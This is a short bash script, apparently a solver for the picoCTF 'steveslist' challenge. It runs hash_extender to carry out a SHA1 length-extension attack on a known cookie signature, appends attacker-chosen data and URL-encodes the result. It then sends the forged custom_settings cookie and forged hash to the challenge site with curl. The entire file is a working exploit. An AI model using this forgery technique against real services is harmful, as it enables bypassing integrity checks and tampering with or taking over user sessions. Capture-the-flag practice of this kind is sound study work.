echo "append $1"
data=$(./hash_extender/hash_extender -d "b:1;" -s 2141b332222df459fd212440824a35e63d37ef69 -f sha1 -l 8 -a $1 --append-format $2 --out-data-format html)
echo -e "DATA: $data\n"
sig=$(echo $data | cut -f 8 -d ' ' | tr -d '\n')
string=$(echo $data | cut -f 11 -d ' ' | tr -d '\n' | php urlencode.php)
echo -e "NEW STRING: $string\nHASH: $sig\n"
curl -b "custom_settings=$string; custom_settings_hash=$sig" steveslist.picoctf.com/
